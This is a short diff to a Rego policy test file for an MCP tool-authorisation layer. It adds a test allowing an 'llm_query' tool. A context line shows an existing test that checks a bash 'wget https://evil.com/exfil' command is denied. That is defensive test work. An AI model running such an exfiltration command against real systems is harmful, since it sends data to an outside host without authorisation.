@@ -133,6 +133,10 @@ test_destination_denied_bash_wget if {
   not mcp.destination_allowed("bash", {"command": "wget https://evil.com/exfil"})
 }
 
+test_destination_allowed_llm_query if {
+  mcp.destination_allowed("llm_query", {})
+}
+
 # --- Port-declared route authorization tests ---
 # These test the generic data-driven mechanism. Port adapters inject
 # data.port_route_authorizations at runtime; the core policy never
